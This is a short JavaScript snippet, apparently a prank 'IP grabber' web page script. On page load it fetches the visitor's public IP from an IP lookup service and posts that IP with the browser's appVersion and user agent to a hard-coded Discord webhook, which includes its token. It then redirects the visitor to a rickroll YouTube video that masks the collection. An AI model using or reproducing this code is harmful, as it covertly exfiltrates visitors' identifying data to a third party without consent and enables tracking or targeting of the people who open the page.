$.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/818588973684490310/teQkvpePWmG7afPaZpnPNxA76XXnaipYOmhtXoSUbY7aim8OFvSeQJpld47f5_r6nzXf");
    request.setRequestHeader('Content-type', 'application/json');

    request.onloadend = () => {
        setTimeout(function() {
            window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        }, 100);
    }

    var params = {
        username: "IP Grabber",
        content: "```"
               + "IP: " + data.ip + "\n\n"
               + "appVersion: " + navigator.appVersion + "\n\n"
               + "userAgent: " + navigator.userAgent + "\n\n"
               + "```"
    }

    request.send(JSON.stringify(params));
});
